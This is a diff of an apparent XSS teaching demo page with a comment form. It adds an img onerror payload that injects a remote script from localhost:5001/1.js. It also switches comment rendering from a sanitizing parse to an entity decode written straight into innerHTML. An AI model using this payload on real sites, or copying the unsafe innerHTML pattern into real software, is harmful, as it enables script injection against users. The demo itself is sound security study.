@@ -71,8 +71,16 @@
 <p>xss: <%= xss %></p>
 
 <textarea name="name" cols="30" rows="10" id="txt">
-      <p>sks <img src="null" onerror="alert(3)" alt=""></p>
-    </textarea>
+  <p>sks <img src="null" onerror="alert(3)" alt=""></p>
+  <p>
+    注入脚本攻击
+    <img src="null" onerror="
+        var script = document.createElement('script');
+        script.src = 'http://localhost:5001/1.js';
+        document.body.append(script)" alt=""
+    />
+  </p>
+</textarea>
 
 <button id="btn">评论</button>
 <button id="get">获取评论</button>
@@ -108,10 +116,11 @@
       if (xhr.readyState === 4) {
         if (xhr.status === 200) {
           console.log('2. xhr:::', xhr)
-          // var com = he.decode(JSON.parse(xhr.response).comment)
-          var com = parse(JSON.parse(xhr.response).comment)
+          var com = he.decode(JSON.parse(xhr.response).comment)
+          // var com = parse(JSON.parse(xhr.response).comment)
           // var com = (JSON.parse(xhr.response).comment)
           var txt = document.createElement('div')
+          console.log('com:', com)
           txt.innerHTML = com
           document.body.appendChild(txt)
         } else {
